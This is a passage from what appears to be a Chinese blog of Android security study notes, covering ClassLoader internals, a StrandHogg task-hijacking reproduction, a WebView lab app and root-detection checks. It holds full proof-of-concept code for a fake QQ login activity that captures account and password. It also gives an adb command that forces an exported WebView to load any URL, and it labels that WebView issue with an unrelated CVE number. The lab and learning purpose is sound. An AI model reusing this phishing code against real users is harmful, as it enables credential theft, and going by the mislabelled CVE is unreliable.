class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//路径：/libcore/ojluni/src/main/java/java/lang/ClassLoader.java</span><br><span class="hljs-keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassNotFoundException</span>(name); <span class="hljs-comment">//抛出异常</span><br>&#125;  <br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>    <span class="hljs-keyword">return</span> Class.classForName(name, <span class="hljs-literal">false</span>, <span class="hljs-literal">null</span>);    <span class="hljs-comment">//调用classForName方法（native）</span><br>&#125;<br><span class="hljs-comment">//路径：/libcore/ojluni/src/main/java/java/lang/Class.java</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> Class&lt;?&gt; classForName(String className, <span class="hljs-type">boolean</span> shouldInitialize,<br>                                    ClassLoader classLoader) <span class="hljs-keyword">throws</span> ClassNotFoundException;<br></code></pre></td></tr></table></figure><p>第一个findclass方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//路径：/libcore/dalvik/src/main/java/dalvik/system/BaseDexClassLoader.java</span><br><span class="hljs-keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>    List&lt;Throwable&gt; suppressedExceptions = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Throwable&gt;();<br>    <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> pathList.findClass(name, suppressedExceptions);<br>    <span class="hljs-keyword">if</span> (c == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">ClassNotFoundException</span> <span class="hljs-variable">cnfe</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassNotFoundException</span>(<span class="hljs-string">&quot;Didn&#x27;t find class \&quot;&quot;</span> + name + <span class="hljs-string">&quot;\&quot; on path: &quot;</span> + pathList);<br>        <span class="hljs-keyword">for</span> (Throwable t : suppressedExceptions) &#123;<br>            cnfe.addSuppressed(t);<br>        &#125;<br>        <span class="hljs-keyword">throw</span> cnfe;<br>    &#125;<br>    <span class="hljs-keyword">return</span> c;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">BaseDexClassLoader</span><span class="hljs-params">(String dexPath, File optimizedDirectory, String librarySearchPath, ClassLoader parent)</span> &#123;<br>    <span class="hljs-built_in">super</span>(parent);<br>    <span class="hljs-built_in">this</span>.pathList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DexPathList</span>(<span class="hljs-built_in">this</span>, dexPath, librarySearchPath, <span class="hljs-literal">null</span>);<br>    <span class="hljs-keyword">if</span> (reporter != <span class="hljs-literal">null</span>) &#123;<br>        reporter.report(<span class="hljs-built_in">this</span>.pathList.getDexPaths());<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">BaseDexClassLoader</span><span class="hljs-params">(ByteBuffer[] dexFiles, ClassLoader parent)</span> &#123;<br>    <span class="hljs-built_in">super</span>(parent);<br>    <span class="hljs-built_in">this</span>.pathList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DexPathList</span>(<span class="hljs-built_in">this</span>, dexFiles);<br>&#125;<br></code></pre></td></tr></table></figure><p>该方法调用了pathlist的findclass()方法，这个pathlist是在BaseDexClassLoader实例初始化创建的，是一个DexPathList对象，对应的findClass()方法代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//路径：/libcore/dalvik/src/main/java/dalvik/system/DexPathList.java</span><br><span class="hljs-keyword">public</span> Class&lt;?&gt; findClass(String name, List&lt;Throwable&gt; suppressed) &#123;<br>    <span class="hljs-keyword">for</span> (Element element : dexElements) &#123;<br>        Class&lt;?&gt; clazz = element.findClass(name, definingContext, suppressed);<br>        <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> clazz;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (dexElementsSuppressedExceptions != <span class="hljs-literal">null</span>) &#123;<br>        suppressed.addAll(Arrays.asList(dexElementsSuppressedExceptions));<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>遍历Element数组dexElements，并对每个元素调用器findClass()方法</p><p><a href="https://gal2xy.github.io/2023/11/25/Android%E4%B8%AD%E7%9A%84ClassLoader/#%E5%9B%9B%E3%80%81ClassLoader%E5%8A%A0%E8%BD%BD%E7%B1%BB%E7%9A%84%E8%BF%87%E7%A8%8B">Android中的ClassLoader - gla2xy’s blog (gal2xy.github.io)</a></p><p><a href="https://gal2xy.github.io/2023/12/10/Android%E7%AC%AC%E4%BA%8C%E4%BB%A3%E5%8A%A0%E5%9B%BA%E5%A3%B3%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E7%8E%B0/">Android第二代加固壳的原理及实现 —— 不落地加载 - gla2xy’s blog (gal2xy.github.io)</a></p><hr><h4 id="安卓漏洞分析"><a href="#安卓漏洞分析" class="headerlink" title="安卓漏洞分析"></a>安卓漏洞分析</h4><h5 id="StrandHogg漏洞复现及原理分析"><a href="#StrandHogg漏洞复现及原理分析" class="headerlink" title="StrandHogg漏洞复现及原理分析"></a>StrandHogg漏洞复现及原理分析</h5><p><strong>漏洞概述：</strong></p><p>   StrandHogg 攻击&#x2F;任务相关性漏洞是因 Android 处理多个任务的方式（尤其是称为“更改父级任务”的功能）存在设计上的 bug 而产生&#x2F;引起的。应用更改父级任务是一项功能，可让应用将某个 activity 从一个任务移至另一个任务。</p><p>StrandHogg 攻击利用了传入应用任务堆栈 activity 审查方式不明确的缺陷，致使恶意应用可以执行以下任一操作：</p><ul><li>将恶意 activity 移入或移出受害堆栈</li><li>受害 activity 运行完毕后，将恶意 activity 设置为返回堆栈。</li></ul><p>攻击者通过操纵 <code>allowTaskReparenting</code> 和 <code>taskAffinity</code> 设置来利用此漏洞。</p><p><img src="image-20240412175652802.png" alt="image-20240412175652802"></p><p><strong>漏洞复现：</strong></p><p>漏洞环境nexus5x  Android6</p><p><img src="image-20240411205836609.png" alt="image-20240411205836609"></p><p><img src="image-20240411205858080.png" alt="image-20240411205858080"></p><p><strong>漏洞分析：</strong></p><p><strong>AndroidManifest.xml</strong></p><p>XML声明:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br></code></pre></td></tr></table></figure><p>这是每个XML文件的标准开头，指定了XML的版本和字符编码</p><p>Manifest标签:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">manifest</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">package</span>=<span class="hljs-string">&quot;com.vuln.strandhogg&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Manifest标签是AndroidManifest.xml文件的根元素，它声明了应用的包名<code>com.vuln.strandhogg</code>，和Android XML命名空间。</p><p>Application标签:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">application</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:allowBackup</span>=<span class="hljs-string">&quot;true&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:icon</span>=<span class="hljs-string">&quot;@mipmap/ic_launcher&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:label</span>=<span class="hljs-string">&quot;@string/app_name&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:roundIcon</span>=<span class="hljs-string">&quot;@mipmap/ic_launcher_round&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:supportsRtl</span>=<span class="hljs-string">&quot;true&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:theme</span>=<span class="hljs-string">&quot;@style/AppTheme&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Application标签定义了整个应用级别的属性，如是否允许用户备份应用数据，应用图标和名称，是否支持RTL布局方式，以及应用的主题样式。</p><p>Activity标签:</p><ul><li>MainActivity Activity</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">activity</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.MainActivity&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">category</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">activity</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这定义了一个主Activity（应用的入口点）。Intent-filter指明了这个Activity应该响应的intent类型，<code>android.intent.action.MAIN</code>和<code>android.intent.category.LAUNCHER</code>表示这个Activity是应用的启动Activity。</p><ul><li>Innocent Activity</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">activity</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.Innocent&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><p>这简单地定义了一个额外的Activity，没有特别的intent-filter。</p><ul><li>Attack Activity</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">activity</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.Attack&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:taskAffinity</span>=<span class="hljs-string">&quot;com.tencent.qqlite&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:allowTaskReparenting</span>=<span class="hljs-string">&quot;true&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><p>这个Activity具有特定的<code>taskAffinity</code>，可能是用于冒充或与另一个应用程序关联，具有<code>allowTaskReparenting</code>属性，这意味着它可以在任务之间移动。</p><p><strong>com&#x2F;vuln&#x2F;strandhogg&#x2F;MainActivity.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.vuln.strandhogg;<br><br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><span class="hljs-keyword">import</span> android.content.Intent;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        <span class="hljs-comment">//setContentView(R.layout.activity_main);</span><br>       <br>        <br>        <span class="hljs-comment">//声明了两个Intent变量，innocent和attack。Intent是Android中用于请求动作的对象。</span><br>        Intent innocent,attack;                     <br>       <br>        <span class="hljs-comment">//实例化了attack意图，并指定要启动的Attack类。</span><br>        attack=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(<span class="hljs-built_in">this</span>,Attack.class);   <br>      <br>        <br>        <span class="hljs-comment">//给attack意图添加了一个标志，指示活动应在新的tesk中启动。</span><br>        attack.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);<br>        <br>        <span class="hljs-comment">//给attack意图添加了一个标志，用于取消活动启动时的过渡动画。</span><br>        attack.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);<br>        <br>        <span class="hljs-comment">//实例化了innocent意图，并指定要启动的Innocent类。给innocent意图添加了一个标志，指示活动同样应在新的任务中启动。</span><br>        innocent=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(<span class="hljs-built_in">this</span>,Innocent.class);<br>        innocent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);<br>        startActivities(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>[]&#123;attack,innocent&#125;);<span class="hljs-comment">//先后启动attack活动与innocent活动</span><br>        finish();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>com&#x2F;vuln&#x2F;strandhogg&#x2F;Attack.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.vuln.strandhogg;<br><br><span class="hljs-comment">//导入了Android框架中用于界面布局和事件处理的类。Bundle用于传递数据，View是所有UI组件的基类，Button和EditText分别是按钮和文本编辑框组件。</span><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.Button;<br><span class="hljs-keyword">import</span> android.widget.EditText;<br><br><br><span class="hljs-comment">//引入Android Jetpack库</span><br><br><span class="hljs-comment">// AndroidX 库中导入了 @Nullable 注解。它用于表示参数、字段或方法返回值可以为 null。</span><br><span class="hljs-keyword">import</span> androidx.annotation.Nullable;    <br><br><span class="hljs-comment">//从AndroidX AppCompat库中导入AlerDialog类，用于向用户显示对话窗口，展示信息或可选择的项目列表</span><br><span class="hljs-keyword">import</span> androidx.appcompat.app.AlertDialog;<br><br><span class="hljs-comment">//AppCompatActivity 是 Android 的 Activity 类的子类，它为旧版本的 Android 提供了兼容性支持和一些额外的功能。创建任何标准 Android 应用程序时，它是一个基本组件，因为它充当应用程序 UI 的容器。</span><br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><br><span class="hljs-comment">//声明了Attack类，继承自AppCompatActivity，使其成为一个活动(Activity)。</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Attack</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    Button bt;<br>    EditText ed1,ed2;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        <br>        <span class="hljs-comment">//通过setContentView方法设置活动的布局，布局文件是R.layout.attack_fishing</span><br>        setContentView(R.layout.attack_fishing);<br>        <br>        <span class="hljs-comment">//调用getSupportActionBar().hide()来隐藏应用的操作栏(ActionBar)。</span><br>        getSupportActionBar().hide();<br>        <br>        <span class="hljs-comment">//通过findViewById方法初始化ed1和ed2，这两个EditText组件分别对应布局中的两个文本输入框。</span><br>        ed1=findViewById(R.id.editText);<br>        ed2=findViewById(R.id.editText2);<br>        <span class="hljs-comment">//按钮组件</span><br>        bt=findViewById(R.id.button);<br>        <span class="hljs-comment">//按钮初始化</span><br>        bt.setOnClickListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">View</span>.OnClickListener() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View view)</span> &#123;<br>                alert(ed1.getText().toString(),ed2.getText().toString());<br>            &#125;<br>        &#125;);<br>    &#125;<br>    <br>    <span class="hljs-comment">//弹窗</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">alert</span><span class="hljs-params">(String account,String password)</span><br>    &#123;<br>        AlertDialog.Builder alert=<span class="hljs-keyword">new</span> <span class="hljs-title class_">AlertDialog</span>.Builder(Attack.<span class="hljs-built_in">this</span>);<br>        alert.setTitle(<span class="hljs-string">&quot;钓鱼攻击&quot;</span>);<br>        alert.setMessage(<span class="hljs-string">&quot;您的QQ账号:&quot;</span> + account + <span class="hljs-string">&quot;\n您的QQ密码:&quot;</span> + password);<br>        alert.setPositiveButton(<span class="hljs-string">&quot;OK&quot;</span>,<span class="hljs-literal">null</span>);<br>        alert.show();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>com&#x2F;vuln&#x2F;strandhogg&#x2F;Innocent.java  启动时的弹窗</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.vuln.strandhogg;<br><br><span class="hljs-keyword">import</span> android.content.DialogInterface;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><br><span class="hljs-keyword">import</span> androidx.annotation.Nullable;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AlertDialog;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Innocent</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br>        AlertDialog.Builder alert=<span class="hljs-keyword">new</span> <span class="hljs-title class_">AlertDialog</span>.Builder(<span class="hljs-built_in">this</span>);<br>        alert.setTitle(<span class="hljs-string">&quot;Innocent&quot;</span>);<br>        alert.setMessage(<span class="hljs-string">&quot;对于用户来说,此活动完全无害&quot;</span>);<br>        alert.setPositiveButton(<span class="hljs-string">&quot;OK&quot;</span>,<span class="hljs-literal">null</span>);<br>        alert.show();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h5 id="Android-WebView漏洞-CVE-2017-13156"><a href="#Android-WebView漏洞-CVE-2017-13156" class="headerlink" title="Android WebView漏洞(CVE-2017-13156)"></a>Android WebView漏洞(CVE-2017-13156)</h5><p><strong>项目地址</strong>：<a href="https://github.com/t4kemyh4nd/vulnwebview">https://github.com/t4kemyh4nd/vulnwebview</a></p><p><strong>代码分析</strong>：</p><p>AndroidManifest.xml</p><p><img src="image-20240410183242166-17127451645171.png" alt="image-20240410183242166"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">Android:exported=&quot;ture&quot;  //可导出状态<br></code></pre></td></tr></table></figure><p>来到<code>com.tmh.vulnwebview.RegistrationWevView</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tmh.vulnwebview;  <span class="hljs-comment">//包名所在</span><br><span class="hljs-comment">//引入Android api</span><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.util.Log;<br><span class="hljs-keyword">import</span> android.webkit.ConsoleMessage;<br><span class="hljs-keyword">import</span> android.webkit.WebChromeClient;<br><span class="hljs-keyword">import</span> android.webkit.WebView;<br><span class="hljs-keyword">import</span> android.webkit.WebViewClient;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><span class="hljs-comment">//定义了RegistrationWebView的类，继承来自AppCompatActivvity</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RegistrationWebView</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>  <br>    <span class="hljs-meta">@Override</span> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState); <span class="hljs-comment">//调用父类的onCreate方法</span><br>        setContentView(C0816R.layout.activity_registration_web_view); <span class="hljs-comment">//设置活动的布局文件</span><br>        setTitle(<span class="hljs-string">&quot;Registration page&quot;</span>);   <span class="hljs-comment">//定义标题</span><br>        loadWebView();             <span class="hljs-comment">//加载WebView</span><br>    &#125;<br>   <br>    <span class="hljs-comment">//实现onCreate的最后一行loadWebView</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">loadWebView</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">WebView</span> <span class="hljs-variable">webView</span> <span class="hljs-operator">=</span> (WebView) findViewById(C0816R.C0819id.webview);  <span class="hljs-comment">//通过 findViewById 方法获取到布局文件中的 WebView 控件</span><br>        <span class="hljs-comment">//打印日志</span><br>        webView.setWebChromeClient(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WebChromeClient</span>() &#123; <br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">onConsoleMessage</span><span class="hljs-params">(ConsoleMessage consoleMessage)</span> &#123;<br>                Log.d(<span class="hljs-string">&quot;MyApplication&quot;</span>, consoleMessage.message() + <span class="hljs-string">&quot; -- From line &quot;</span> + consoleMessage.lineNumber() + <span class="hljs-string">&quot; of &quot;</span> + consoleMessage.sourceId());<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;);<br>        <span class="hljs-comment">//s&#x27;ge&#x27;z</span><br>        webView.setWebViewClient(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WebViewClient</span>());<br>        webView.getSettings().setAllowUniversalAccessFromFileURLs(<span class="hljs-literal">true</span>);<br>        webView.getSettings().setJavaScriptEnabled(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">if</span> (getIntent().getExtras().getBoolean(<span class="hljs-string">&quot;is_reg&quot;</span>, <span class="hljs-literal">false</span>)) &#123;<br>            webView.loadUrl(<span class="hljs-string">&quot;file:///android_asset/registration.html&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            webView.loadUrl(getIntent().getStringExtra(<span class="hljs-string">&quot;reg_url&quot;</span>));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>复现：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">adb shell am start -n com.tmh.vulnwebview/.RegistrationWebView --es reg_url &quot;http://www.baidu.com&quot;<br></code></pre></td></tr></table></figure><p>android8以下可以</p><p><img src="image-20240410213347069.png" alt="image-20240410213347069"></p><hr><h4 id="android逆向"><a href="#android逆向" class="headerlink" title="android逆向"></a>android逆向</h4><h5 id="常规root检测"><a href="#常规root检测" class="headerlink" title="常规root检测"></a>常规root检测</h5><p>遍历目录：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot;/sbin/su&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;/system/bin/su&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;/system/sbin/su&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;/system/xbin/su&quot;</span><br></code></pre></td></tr></table></figure><p>新建文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/data、/system、/etc <br></code></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">su，<span class="hljs-built_in">find</span>，mount<br></code></pre></td></tr></table></figure><p>读取手机编译版本、调试状态 例如读取&#x2F;system&#x2F;build.prop中 